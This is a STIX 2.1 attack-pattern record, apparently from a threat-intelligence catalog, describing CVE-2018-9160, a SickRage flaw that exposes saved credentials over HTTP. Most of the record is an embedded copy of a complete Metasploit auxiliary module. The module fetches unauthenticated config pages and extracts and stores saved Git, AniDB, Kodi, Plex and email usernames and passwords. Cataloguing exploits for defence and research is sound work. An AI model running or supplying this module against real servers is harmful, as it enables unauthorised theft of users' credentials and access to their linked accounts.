{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--93939cc9-22ea-42d9-bf58-c8b42243f665",
    "created": "2024-08-14T16:30:58.362613Z",
    "modified": "2024-08-14T16:30:58.362617Z",
    "name": "HTTP SickRage Password Leak",
    "description": " SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP responses unless the user has set login information for SickRage.  By default, SickRage does not require login information for the installation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/http_sickrage_password_leak.rb",
            "external_id": "http_sickrage_password_leak.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-9160"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HTTP SickRage Password Leak',\n      'Description'    => %q{\n        SickRage < v2018-09-03 allows an attacker to view a user's saved Github credentials in HTTP\n        responses unless the user has set login information for SickRage.\n\n        By default, SickRage does not require login information for the installation.\n      },\n      'Author'         =>\n      [\n        'Sven Fassbender', # EDB POC\n        'Shelby Pace'     # Metasploit Module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2018-9160'],\n          ['EDB', '44545']\n        ],\n      'DisclosureDate' => '2018-03-08'\n    ))\n\n    register_options(\n    [\n      OptString.new('TARGETURI', [true, 'Optional path that gets prepended to the default paths to be searched', '/']),\n      Opt::RPORT(8081)\n    ])\n  end\n\n  def get_config(path)\n    uri = normalize_uri(target_uri.path, path)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => uri\n    )\n\n    # Improve this later: Add a loginscanner.\n    if res && res.headers['Location'] =~ /^\\/login\\//\n      raise RuntimeError, 'SickRage is protected with authentication'\n    end\n\n    unless res && res.code == 200\n      print_error(\"Unable to reach #{uri}\")\n      return\n    end\n\n    res.get_html_document\n  end\n\n  def is_valid?(user, pass)\n    !(user.empty? || ['None', 'hidden_value'].include?(pass))\n  end\n\n  def save_creds(app, user, pass)\n    print_good(\"#{app} username: #{user}\")\n    print_good(\"#{app} password: #{pass}\")\n    store_valid_credential(user: user, private: pass)\n  end\n\n  def get_creds(path, config)\n    return if config.at(\"input[@id=\\\"#{path}_username\\\"]\").nil?\n\n    username = config.at(\"input[@id=\\\"#{path}_username\\\"]\").attribute('value').to_s\n    password = config.at(\"input[@id=\\\"#{path}_password\\\"]\").attribute('value').to_s\n\n    if is_valid?(username, password)\n      save_creds(path, username, password)\n    end\n  end\n\n  def get_notification_creds(config)\n    return if config.at('input[@id=\"email_host\"]').nil?\n\n    hostname = config.at('input[@id=\"email_host\"]').attribute('value').to_s\n    email_user = config.at('input[@id=\"email_user\"]').attribute('value').to_s\n    email_pass = config.at('input[@id=\"email_password\"]').attribute('value').to_s\n\n    if is_valid?(email_user, email_pass)\n      save_creds(\"Email\", \"#{email_user}@#{hostname}\", email_pass)\n    end\n  end\n\n  def run\n    begin\n      paths = ['/config/general/', '/config/anime/', '/config/notifications/']\n      paths.each do |path|\n        config = get_config(path)\n        next if config.nil?\n\n        if path.split('/').last.eql?('notifications')\n          get_notification_creds(config)\n        end\n\n        ['git', 'anidb', 'kodi', 'plex_server', 'plex_client'].each do |path|\n          get_creds(path, config)\n        end\n      end\n    rescue RuntimeError => e\n      print_error(e.message)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-03-08"
}